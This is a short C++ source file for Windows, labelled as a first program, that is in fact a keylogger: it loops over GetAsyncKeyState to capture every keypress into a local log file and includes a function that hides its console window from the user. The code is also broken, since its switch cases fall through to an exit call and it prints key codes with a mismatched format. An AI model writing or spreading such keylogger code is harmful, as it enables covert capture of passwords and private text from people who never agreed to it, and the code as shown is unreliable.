// my first program in C++
#include <iostream>
#include <stdio.h>
using namespace std;
#include <Windows.h>
#include <Winuser.h>

int Save (int key_stroke , char *file);
void Stealth();

int main()
{
    //Stealth();
    char i;

    while (1)
    {
        for(i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
                Save (i , "log.TXT");
        }
    }
    system ("PAUSE");
    return 0;
}


int Save (int key_stroke, char *file)
{
    if ( (key_stroke == 1) || (key_stroke == 2))
        return 0;


    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file , "a+");
    cout << key_stroke << endl;

    switch (key_stroke) {
case 8:
    fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
case 13:
    fprintf(OUTPUT_FILE, "%s", "\n");
case 32:
    fprintf(OUTPUT_FILE, "%s", " ");
case 190:
    fprintf(OUTPUT_FILE, "%s", ".");
case 127:
    exit (0);
default:
    fprintf(OUTPUT_FILE, "%s", &key_stroke);
    }

    fclose(OUTPUT_FILE);
    return 0;
}


void Stealth ()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);
}
